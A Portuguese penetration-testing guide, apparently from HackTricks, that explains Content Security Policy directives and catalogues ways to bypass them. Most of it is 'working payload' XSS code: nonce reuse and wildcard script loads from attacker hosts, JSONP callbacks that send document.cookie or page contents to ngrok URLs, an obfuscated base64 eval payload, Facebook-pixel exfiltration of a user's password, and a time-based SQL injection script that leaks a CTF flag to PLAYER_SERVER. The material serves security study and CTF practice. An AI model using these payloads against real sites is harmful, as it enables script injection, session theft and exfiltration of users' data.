# Política de Segurança de Conteúdo (CSP) Bypass

{{#include ../../banners/hacktricks-training.md}}

## O que é CSP

Content Security Policy (CSP) é reconhecida como uma tecnologia do browser, destinada principalmente a **proteger contra ataques como cross-site scripting (XSS)**. Ela funciona definindo e detalhando caminhos e fontes de onde recursos podem ser carregados de forma segura pelo navegador. Esses recursos abrangem uma variedade de elementos como imagens, frames e JavaScript. Por exemplo, uma policy pode permitir o carregamento e execução de recursos do mesmo domínio (self), incluindo recursos inline e a execução de código em string através de funções como `eval`, `setTimeout`, ou `setInterval`.

A implementação do CSP é feita através de **cabeçalhos de resposta** ou pela inclusão de **elementos meta na página HTML**. Seguindo essa política, os navegadores aplicam proativamente essas disposições e bloqueiam imediatamente quaisquer violações detectadas.

- Implementado via cabeçalho de resposta:
```
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
- Implementado via meta tag:
```xml
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### Cabeçalhos

CSP pode ser aplicado ou monitorado usando estes cabeçalhos:

- `Content-Security-Policy`: Aplica a CSP; o navegador bloqueia quaisquer violações.
- `Content-Security-Policy-Report-Only`: Usado para monitoramento; reporta violações sem bloqueá-las. Ideal para testes em ambientes de pré-produção.

### Definindo Recursos

CSP restringe as origens para o carregamento de conteúdo ativo e passivo, controlando aspectos como a execução de JavaScript inline e o uso de `eval()`. Um exemplo de política é:
```bash
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### Diretivas

- **script-src**: Permite fontes específicas para JavaScript, incluindo URLs, scripts inline e scripts acionados por manipuladores de eventos ou folhas de estilo XSLT.
- **default-src**: Define uma política padrão para busca de recursos quando diretivas específicas de fetch estão ausentes.
- **child-src**: Especifica recursos permitidos para web workers e conteúdos de frames embutidos.
- **connect-src**: Restringe URLs que podem ser carregadas usando interfaces como fetch, WebSocket, XMLHttpRequest.
- **frame-src**: Restringe URLs para frames.
- **frame-ancestors**: Especifica quais fontes podem incorporar a página atual, aplicável a elementos como `<frame>`, `<iframe>`, `<object>`, `<embed>`, e `<applet>`.
- **img-src**: Define fontes permitidas para imagens.
- **font-src**: Especifica fontes válidas para fonts carregadas usando `@font-face`.
- **manifest-src**: Define fontes permitidas para arquivos de manifest de aplicação.
- **media-src**: Define fontes permitidas para carregar objetos de mídia.
- **object-src**: Define fontes permitidas para elementos `<object>`, `<embed>`, e `<applet>`.
- **base-uri**: Especifica URLs permitidos para carregamento usando elementos `<base>`.
- **form-action**: Lista endpoints válidos para submissões de formulários.
- **plugin-types**: Restringe tipos MIME que a página pode invocar.
- **upgrade-insecure-requests**: Instrui os browsers a reescrever URLs HTTP para HTTPS.
- **sandbox**: Aplica restrições similares ao atributo sandbox de um `<iframe>`.
- **report-to**: Especifica um grupo para o qual um relatório será enviado caso a política seja violada.
- **worker-src**: Especifica fontes válidas para scripts Worker, SharedWorker ou ServiceWorker.
- **prefetch-src**: Especifica fontes válidas para recursos que serão buscados ou pré-carregados.
- **navigate-to**: Restringe as URLs para as quais um documento pode navegar por qualquer meio (a, form, window.location, window.open, etc.)

### Origens

- `*`: Permite todas as URLs exceto aquelas com os esquemas `data:`, `blob:`, `filesystem:`.
- `'self'`: Permite carregamento do mesmo domínio.
- `'data'`: Permite que recursos sejam carregados via esquema data (ex.: imagens codificadas em Base64).
- `'none'`: Bloqueia carregamento de qualquer fonte.
- `'unsafe-eval'`: Permite o uso de `eval()` e métodos similares; não recomendado por razões de segurança.
- `'unsafe-hashes'`: Habilita manipuladores de eventos inline específicos.
- `'unsafe-inline'`: Permite o uso de recursos inline como `<script>` ou `<style>` inline; não recomendado por razões de segurança.
- `'nonce'`: Lista branca para scripts inline específicos usando um nonce criptográfico (número usado uma vez).
- If you have JS limited execution it's possible to get a used nonce inside the page with `doc.defaultView.top.document.querySelector("[nonce]")` and then reuse it to load a malicious script (if strict-dynamic is used, any allowed source can load new sources so this isn't needed), like in:

<details>

<summary>Carregar script reutilizando nonce</summary>
```html
<!-- From https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/ -->
<img
src="x"
ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)' />
```
</details>

- `'sha256-<hash>'`: Permite scripts com um hash sha256 específico.
- `'strict-dynamic'`: Permite carregar scripts de qualquer origem se tiver sido autorizado por um nonce ou hash.
- `'host'`: Especifica um host específico, como `example.com`.
- `https:`: Restringe URLs àquelas que usam HTTPS.
- `blob:`: Permite que recursos sejam carregados a partir de Blob URLs (por exemplo, Blob URLs criadas via JavaScript).
- `filesystem:`: Permite que recursos sejam carregados a partir do filesystem.
- `'report-sample'`: Inclui um exemplo do código violador no relatório de violação (útil para depuração).
- `'strict-origin'`: Semelhante a 'self', mas garante que o nível de segurança do protocolo das fontes corresponda ao do documento (apenas origens seguras podem carregar recursos de origens seguras).
- `'strict-origin-when-cross-origin'`: Envia URLs completas quando faz requisições same-origin, mas envia apenas a origem quando a requisição é cross-origin.
- `'unsafe-allow-redirects'`: Permite que recursos sejam carregados que irão redirecionar imediatamente para outro recurso. Não recomendado pois enfraquece a segurança.

## Regras CSP inseguras

### 'unsafe-inline'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
Payload funcional: `"/><script>alert(1);</script>`

#### self + 'unsafe-inline' via Iframes


{{#ref}}
csp-bypass-self-+-unsafe-inline-with-iframes.md
{{#endref}}

### 'unsafe-eval'

> [!CAUTION]
> Isto não está funcionando, para mais informações [**check this**](https://github.com/HackTricks-wiki/hacktricks/issues/653).
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
Payload funcional:
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

Se de alguma forma você conseguir fazer com que um **código JS permitido crie uma nova script tag** no DOM com seu código JS, porque um script permitido está criando-a, a **nova script tag poderá ser executada**.

### Wildcard (\*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
Payload funcional:
```html
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### Ausência de object-src e default-src

> [!CAUTION] > **Parece que isso não está mais funcionando**
```yaml
Content-Security-Policy: script-src 'self' ;
```
Payloads que funcionam:
```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### File Upload + 'self'
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
Se você conseguir fazer upload de um arquivo JS, pode contornar esse CSP:

Payload funcional:
```html
"/>'><script src="/uploads/picture.png.js"></script>
```
No entanto, é altamente provável que o servidor esteja **validando o arquivo enviado** e só permita que você **envie determinados tipos de arquivos**.

Além disso, mesmo que você pudesse enviar um **JS code inside** dentro de um arquivo usando uma extensão aceita pelo servidor (como: _script.png_), isso não seria suficiente, porque alguns servidores como o apache server **select MIME type of the file based on the extension** e navegadores como o Chrome irão **reject to execute Javascript** code dentro de algo que deveria ser uma imagem. "Hopefully", existem falhas. Por exemplo, num CTF aprendi que **Apache doesn't know** a extensão _**.wave**_, portanto ele não a serve com um **MIME type like audio/***.

A partir daqui, se você encontrar um XSS e um upload de arquivo, e conseguir identificar uma **misinterpreted extension**, pode tentar enviar um arquivo com essa extensão contendo o conteúdo do script. Ou, se o servidor verifica o formato correto do arquivo enviado, crie um polyglot ([some polyglot examples here](https://github.com/Polydet/polyglot-database)).

### Form-action

Se não for possível injetar JS, você ainda pode tentar exfiltrar, por exemplo, credenciais **injecting a form action** (e talvez esperando que password managers preencham automaticamente as senhas). Você pode encontrar um [**example in this report**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp). Além disso, note que `default-src` não cobre form actions.

> [!WARNING]
> Para alguns dos seguintes payload **`unsafe-eval` nem sequer é necessário**.
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
Carregar uma versão vulnerável do angular e executar JS arbitrário:
```xml
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### Payloads usando Angular + uma biblioteca com funções que retornam o objeto `window` ([check out this post](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)):

> [!TIP]
> O post mostra que você pode **carregar** todas as **bibliotecas** de `cdn.cloudflare.com` (ou qualquer outro repositório de bibliotecas JS permitido), executar todas as funções adicionadas de cada biblioteca e verificar **quais funções de quais bibliotecas retornam o objeto `window`**.
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>
```
Angular XSS a partir de um nome de classe:
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
#### Abusando do google recaptcha JS code

De acordo com [**this CTF writeup**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?_x_tr_sl=es&_x_tr_tl=en&_x_tr_hl=es&_x_tr_pto=wapp#noteninja-3-solves) você pode abusar de [https://www.google.com/recaptcha/](https://www.google.com/recaptcha/) dentro de uma CSP para executar código JS arbitrário contornando a CSP:
```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```
Mais [**payloads deste writeup**](https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/):
```html
<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>

<!-- Trigger alert -->
<img src="x" ng-on-error="$event.target.ownerDocument.defaultView.alert(1)" />

<!-- Reuse nonce -->
<img
src="x"
ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)' />
```
#### Abusando do www.google.com para open redirect

A seguinte URL redireciona para example.com (de [aqui](https://www.landh.tech/blog/20240304-google-hack-50000/)):
```
https://www.google.com/amp/s/example.com/
```
Abusando de \*.google.com/script.google.com

É possível abusar do Google Apps Script para receber informações em uma página dentro de script.google.com. Como é [feito neste relatório](https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/).

### Endpoints de terceiros + JSONP
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
Cenários como este, em que `script-src` está definido como `self` e um domínio específico está whitelisted, podem ser contornados usando JSONP. Endpoints JSONP permitem callbacks inseguros que permitem a um atacante realizar XSS. Payload funcional:
```html
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```

```html
<script type="text/javascript" crossorigin="anonymous" src="https://accounts.google.com/o/oauth2/revoke?callback=eval(atob(%27KGZ1bmN0aW9uKCl7CiBsZXQgdnIgPSAoKT0%2Be3dpdGgobmV3IHRvcFsnVydbJ2NvbmNhdCddKCdlYicsJ1MnLCdjZycmJidvY2snfHwncGsnLCdldCcpXSgndydbJ2NvbmNhdCddKCdzcycsJzpkZWZkZWYnLCdsaScsJ3ZlY2hhdGknLCduYycsJy4nfHwnOycsJ25ldHdvcmtkZWZjaGF0cGlwZWRlZjAyOWRlZicpWydzcGxpdCddKCdkZWYnKVsnam9pbiddKCIvIikpKShvbm1lc3NhZ2U9KGUpPT5uZXcgRnVuY3Rpb24oYXRvYihlWydkYXRhJ10pKS5jYWxsKGVbJ3RhcmdldCddKSl9O25hdmlnYXRvclsnd2ViZHJpdmVyJ118fChsb2NhdGlvblsnaHJlZiddWydtYXRjaCddKCdjaGVja291dCcpJiZ2cigpKTsKfSkoKQ%3D%3D%27));"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **contém endpoints JSONP prontos para uso para bypass de CSP em diferentes websites.**

A mesma vulnerabilidade ocorrerá se o **endpoint confiável contiver um Open Redirect** porque, se o endpoint inicial é confiável, os redirecionamentos também são confiáveis.

### Abusos de Terceiros

Como descrito no [following post](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses), existem muitos domínios de terceiros que podem estar permitidos em algum lugar no CSP e que podem ser abusados para exfiltrar dados ou executar código JavaScript. Alguns desses terceiros são:

| Entidade          | Domínio Permitido                             | Capacidades  |
| ----------------- | -------------------------------------------- | ------------ |
| Facebook          | www.facebook.com, \*.facebook.com            | Exfil        |
| Hotjar            | \*.hotjar.com, ask.hotjar.io                 | Exfil        |
| Jsdelivr          | \*.jsdelivr.com, cdn.jsdelivr.net            | Exec         |
| Amazon CloudFront | \*.cloudfront.net                            | Exfil, Exec  |
| Amazon AWS        | \*.amazonaws.com                             | Exfil, Exec  |
| Azure Websites    | \*.azurewebsites.net, \*.azurestaticapps.net | Exfil, Exec  |
| Salesforce Heroku | \*.herokuapp.com                             | Exfil, Exec  |
| Google Firebase   | \*.firebaseapp.com                           | Exfil, Exec  |

Se você encontrar qualquer um dos domínios permitidos no CSP do seu alvo, há grandes chances de que você consiga contornar o CSP registrando-se no serviço de terceiros e, então, exfiltrar dados para esse serviço ou executar código.

Por exemplo, se você encontrar o seguinte CSP:
```
Content-Security-Policy​: default-src 'self’ www.facebook.com;​
```
ou
```
Content-Security-Policy​: connect-src www.facebook.com;​
```
Você deve ser capaz de exfiltrar dados, similarly as it has always be done with [Google Analytics](https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp)/[Google Tag Manager](https://blog.deteact.com/csp-bypass/). Neste caso, siga estes passos gerais:

1. Crie uma conta de Facebook Developer aqui.
2. Crie um novo app "Facebook Login" e selecione "Website".
3. Vá em "Settings -> Basic" e obtenha seu "App ID"
4. No site alvo do qual você quer exfiltrar dados, você pode exfiltrar dados usando diretamente o gadget do Facebook SDK "fbq" através de um "customEvent" e o data payload.
5. Vá ao "Event Manager" do seu App e selecione a aplicação que você criou (note que o event manager pode ser encontrado em uma URL similar a esta: https://www.facebook.com/events\_manager2/list/pixel/\[app-id]/test\_events
6. Selecione a aba "Test Events" para ver os eventos sendo enviados pelo "your" web site.

Então, no lado da vítima, execute o código a seguir para inicializar o Facebook tracking pixel apontando para o app-id da conta Facebook Developer do atacante e emitir um custom event assim:
```JavaScript
fbq('init', '1279785999289471');​ // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{​
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"​
});
```
Quanto aos outros sete domínios de terceiros especificados na tabela anterior, existem muitas outras formas de abusá-los. Consulte o [blog post](https://sensepost.com/blog/2023/dress-codethe-talk/#bypasses) mencionado anteriormente para explicações adicionais sobre outros abusos a terceiros.

### Bypass via RPO (Relative Path Overwrite) <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

Além da redireção mencionada anteriormente para bypass de restrições de path, existe outra técnica chamada Relative Path Overwrite (RPO) que pode ser usada em alguns servidores.

Por exemplo, se o CSP permite o path `https://example.com/scripts/react/`, ele pode ser bypassed da seguinte forma:
```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```
O navegador acabará carregando `https://example.com/scripts/angular/angular.js`.

Isso funciona porque, para o navegador, você está carregando um arquivo chamado `..%2fangular%2fangular.js` localizado em `https://example.com/scripts/react/`, o que está em conformidade com o CSP.

Então, ele irá decodificá-lo, requisitando efetivamente `https://example.com/scripts/react/../angular/angular.js`, o que é equivalente a `https://example.com/scripts/angular/angular.js`.

Ao **explorar essa inconsistência na interpretação de URLs entre o navegador e o servidor, as regras de caminho podem ser contornadas**.

A solução é não tratar `%2f` como `/` no lado do servidor, garantindo uma interpretação consistente entre o navegador e o servidor para evitar esse problema.

Online Example:[ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### Iframes JS execution


{{#ref}}
../xss-cross-site-scripting/iframes-in-xss-and-csp.md
{{#endref}}

### Ausência de **base-uri**

Se a diretiva **base-uri** estiver ausente, você pode abusar dela para realizar um [**dangling markup injection**](../dangling-markup-html-scriptless-injection/index.html).

Além disso, se a **página estiver carregando um script usando um caminho relativo** (como `<script src="/js/app.js">`) usando um **Nonce**, você pode abusar da **base** **tag** para fazê-la **load** o script do **your own server achieving a XSS.**\
Se a página vulnerável estiver carregada com **httpS**, use uma httpS url no base.
```html
<base href="https://www.attacker.com/" />
```
### Eventos do AngularJS

Uma política específica conhecida como Content Security Policy (CSP) pode restringir eventos JavaScript. No entanto, o AngularJS introduz eventos customizados como alternativa. Dentro de um evento, o AngularJS fornece um objeto único `$event`, que referencia o objeto de evento nativo do browser. Esse objeto `$event` pode ser explorado para contornar a CSP. Notavelmente, no Chrome, o objeto `$event/event` possui um atributo `path`, que contém um array de objetos envolvidos na cadeia de execução do evento, com o objeto `window` sempre posicionado no final. Essa estrutura é fundamental para táticas de escape do sandbox.

Ao direcionar esse array para o filtro `orderBy`, é possível iterar sobre ele, aproveitando o elemento terminal (o objeto `window`) para acionar uma função global como `alert()`. O snippet de código mostrado abaixo elucida esse processo:
```xml
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
Este trecho destaca o uso da diretiva `ng-focus` para acionar o evento, empregando `$event.path|orderBy` para manipular o array `path`, e aproveitando o objeto `window` para executar a função `alert()`, revelando assim `document.cookie`.

**Encontre outros bypasses do Angular em** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### AngularJS and whitelisted domain
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
Uma política CSP que adiciona domínios à whitelist para carregamento de scripts em uma aplicação Angular JS pode ser contornada pela invocação de funções de callback e por certas classes vulneráveis. Mais informações sobre essa técnica podem ser encontradas em um guia detalhado disponível neste [git repository](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22).

Working payloads:
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
Outros endpoints de execução arbitrária JSONP podem ser encontrados em [**aqui**](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) (alguns deles foram deletados ou corrigidos)

### Bypass via Redirecionamento

O que acontece quando o CSP encontra um redirecionamento do lado do servidor? Se o redirecionamento levar a uma origem diferente que não é permitida, ainda assim falhará.

No entanto, de acordo com a descrição em [CSP spec 4.2.2.3. Paths and Redirects](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects), se o redirecionamento levar a um caminho diferente, ele pode contornar as restrições originais.

Aqui está um exemplo:
```html
<!DOCTYPE html>
<html>
<head>
<meta
http-equiv="Content-Security-Policy"
content="script-src http://localhost:5555 https://www.google.com/a/b/c/d" />
</head>
<body>
<div id="userContent">
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```
Se o CSP estiver definido como `https://www.google.com/a/b/c/d`, uma vez que o caminho é considerado, ambos os scripts `/test` e `/a/test` serão bloqueados pelo CSP.

No entanto, o endpoint final `http://localhost:5555/301` será **redirecionado no lado do servidor para `https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//`**. Como é um redirecionamento, o **caminho não é considerado**, e o **script pode ser carregado**, assim contornando a restrição de caminho.

Com esse redirecionamento, mesmo que o caminho esteja especificado completamente, ele ainda será contornado.

Portanto, a melhor solução é garantir que o site não tenha vulnerabilidades de open redirect e que não existam domínios que possam ser explorados nas regras CSP.

### Contornar CSP com dangling markup

Leia [aqui](../dangling-markup-html-scriptless-injection/index.html).

### 'unsafe-inline'; img-src \*; via XSS
```
default-src 'self' 'unsafe-inline'; img-src *;
```
`'unsafe-inline'` significa que você pode executar qualquer script dentro do código (XSS pode executar código) e `img-src *` significa que você pode usar na webpage qualquer imagem de qualquer recurso.

Você pode contornar este CSP exfiltrando os dados via imagens (neste caso o XSS abusa de um CSRF onde uma página acessível pelo bot contém um SQLi, e extrai a flag via uma imagem):
```javascript
<script>
fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new
Image().src='http://PLAYER_SERVER/?'+_)
</script>
```
Fonte: [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

Você também pode abusar desta configuração para **carregar código javascript inserido dentro de uma imagem**. Por exemplo, se a página permite carregar imagens do Twitter. Você poderia **criar** uma **imagem especial**, **fazer upload** dela no Twitter e abusar do "**unsafe-inline**" para **executar** um código JS (como um XSS normal) que irá **carregar** a **imagem**, **extrair** o **JS** dela e **executá-lo**: [https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### Com Service Workers

A função `importScripts` dos Service Workers não é limitada pelo CSP:


{{#ref}}
../xss-cross-site-scripting/abusing-service-workers.md
{{#endref}}

### Policy Injection

**Pesquisa:** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

Se um **parâmetro** enviado por você estiver sendo **colado dentro** da **declaração** da **policy**, então você poderia **alterar** a **policy** de alguma forma que a torne **inútil**. Você poderia **permitir script 'unsafe-inline'** com qualquer um desses bypasses:
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
Porque esta diretiva vai **sobrescrever as diretivas script-src existentes**.\
Você pode encontrar um exemplo aqui: [http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+*&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

No Edge é muito mais simples. Se você conseguir adicionar na CSP apenas isto: **`;_`** **Edge** irá **descartar** toda a **política**.\
Exemplo: [http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](<http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;_&y=%3Cscript%3Ealert(1)%3C/script%3E>)

### img-src \*; via XSS (iframe) - Time attack

Observe a falta da diretiva `'unsafe-inline'`\
Desta vez você pode fazer a vítima **carregar** uma página **sob seu controle** via **XSS** com um `<iframe`. Desta vez você fará com que a vítima acesse a página de onde você quer extrair informação (**CSRF**). Você não pode acessar o conteúdo da página, mas se de alguma forma você puder **controlar o tempo que a página leva para carregar** você pode extrair a informação de que precisa.

Desta vez uma **flag** será extraída: sempre que um **char for corretamente adivinhado** via SQLi a **resposta** demora **mais tempo** devido à função sleep. Então, você poderá extrair a flag:
```html
<!--code from https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle -->
<iframe name="f" id="g"></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org"
function gen(x) {
x = escape(x.replace(/_/g, "\\_"))
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`
}

function gen2(x) {
x = escape(x)
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`
}

async function query(word, end = false) {
let h = performance.now()
f.location = end ? gen2(word) : gen(word)
await new Promise((r) => {
g.onload = r
})
let diff = performance.now() - h
return diff > 300
}

let alphabet = "_abcdefghijklmnopqrstuvwxyz0123456789".split("")
let postfix = "}"

async function run() {
let prefix = "nn9ed{"
while (true) {
let i = 0
for (i; i < alphabet.length; i++) {
let c = alphabet[i]
let t = await query(prefix + c) // Check what chars returns TRUE or FALSE
console.log(prefix, c, t)
if (t) {
console.log("FOUND!")
prefix += c
break
}
}
if (i == alphabet.length) {
console.log("missing chars")
break
}
let t = await query(prefix + "}", true)
if (t) {
prefix += "}"
break
}
}
new Image().src = "http://PLAYER_SERVER/?" + prefix //Exfiltrate the flag
console.log(prefix)
}

run()
</script>
```
### Por Bookmarklets

Esse ataque implicaria alguma engenharia social em que o atacante **convence o usuário a arrastar e soltar um link sobre o bookmarklet do navegador**. Esse bookmarklet conteria código **javascript malicioso** que, quando arrastado e solto ou clicado, seria executado no contexto da janela web atual, **burlando o CSP e permitindo roubar informações sensíveis** tais como cookies ou tokens.

For more information [**check the original report here**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/).

### CSP bypass ao restringir CSP

In [**this CTF writeup**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution), CSP is bypassed by injecting inside an allowed iframe a more restrictive CSP that disallowed to load a specific JS file that, then, via **prototype pollution** or **dom clobbering** allowed to **abuse a different script to load an arbitrary script**.

Você pode **restringir o CSP de um iframe** com o atributo **`csp`**:
```html
<iframe
src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]"
csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
Em [**this CTF writeup**](https://github.com/aszx87410/ctf-writeups/issues/48), foi possível via **HTML injection** **restringir** ainda mais uma **CSP** de modo que um script que impedia CSTI foi desabilitado e, portanto, a **vulnerability became exploitable.**\
A **CSP** pode ser tornada mais restritiva usando **HTML meta tags** e inline scripts podem ser desabilitados **removendo** a **entrada** que permite seu **nonce** e **enable specific inline script via sha**:
```html
<meta
http-equiv="Content-Security-Policy"
content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';" />
```
### JS exfiltration com Content-Security-Policy-Report-Only

Se você conseguir fazer com que o servidor responda com o header **`Content-Security-Policy-Report-Only`** com um **value controlled by you** (maybe because of a CRLF), você poderia fazê-lo apontar para o seu servidor e, se você **wraps** o **JS content** que deseja exfiltrate com **`<script>`**, e como é altamente provável que `unsafe-inline` não seja permitido pela CSP, isso irá **trigger a CSP error** e parte do script (contendo a informação sensível) será enviada para o servidor a partir de `Content-Security-Policy-Report-Only`.

